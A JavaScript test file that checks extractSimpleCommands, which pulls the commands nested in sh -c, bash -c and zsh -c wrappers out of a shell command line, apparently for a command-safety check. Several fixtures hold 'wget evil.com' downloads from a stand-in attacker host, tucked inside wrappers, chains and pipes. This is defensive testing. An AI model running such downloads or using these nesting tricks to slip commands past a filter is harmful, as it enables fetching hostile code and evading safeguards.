import { extractSimpleCommands } from '../../extractSimpleCommands.js';

describe('extractCommandLineFromShC', () => {
  it.each([
    // Basic sh -c with simple command
    {
      commandLine: "sh -c 'echo hello'",
      expected: ['echo hello'],
    },
    {
      commandLine: "sh -c 'wget evil.com'",
      expected: ['wget evil.com'],
    },

    // sh -c with complex command
    {
      commandLine: "sh -c 'echo hello; tail file'",
      expected: ['echo hello', 'tail file'],
    },
    {
      commandLine: "sh -c 'echo ok && wget evil.com'",
      expected: ['echo ok', 'wget evil.com'],
    },

    // sh -c with flags before -c
    {
      commandLine: "sh -x -e -c 'echo ok && wget evil.com'",
      expected: ['echo ok', 'wget evil.com'],
    },
    {
      commandLine: "sh -x -e -c 'echo ok && touch test'",
      expected: ['echo ok', 'touch test'],
    },

    // sh -c with environment variables
    {
      commandLine: "FOO=bar sh -c 'wget evil.com'",
      expected: ['wget evil.com'],
    },
    {
      commandLine: "FOO=bar sh -c 'echo hello'",
      expected: ['echo hello'],
    },

    // Chained sh -c
    {
      commandLine: "sh -c 'echo hello' | sh -c 'wget evil'",
      expected: ['echo hello', 'wget evil'],
    },

    // sh without -c (treated as regular command)
    {
      commandLine: 'echo hello | sh',
      expected: ['echo hello', 'sh'],
    },
    {
      commandLine: 'sh -x script.sh',
      expected: ['sh -x script.sh'],
    },

    // sh -c in control structures
    {
      commandLine: "while true; do sh -c 'echo hello'; done",
      expected: ['true', 'echo hello'],
    },
    {
      commandLine: "for i in 1 2; do sh -c 'echo $i'; done",
      expected: ['echo $i'],
    },

    // sh -c with time prefix
    {
      commandLine: "time sh -c 'echo hello'",
      expected: ['echo hello'],
    },

    // sh -c combined with other commands
    {
      commandLine: "echo start && sh -c 'wget evil.com'",
      expected: ['echo start', 'wget evil.com'],
    },

    // zsh -c (same logic as sh -c)
    { commandLine: "zsh -c 'echo hello'", expected: ['echo hello'] },
    { commandLine: "zsh -c 'wget evil.com'", expected: ['wget evil.com'] },

    // bash -c (same logic as sh -c)
    { commandLine: "bash -c 'echo hello'", expected: ['echo hello'] },
    { commandLine: "bash -c 'wget evil.com'", expected: ['wget evil.com'] },
  ])('$commandLine', ({ commandLine, expected }) => {
    const actual = extractSimpleCommands(commandLine);
    expect(actual).toEqual(expected);
  });
});
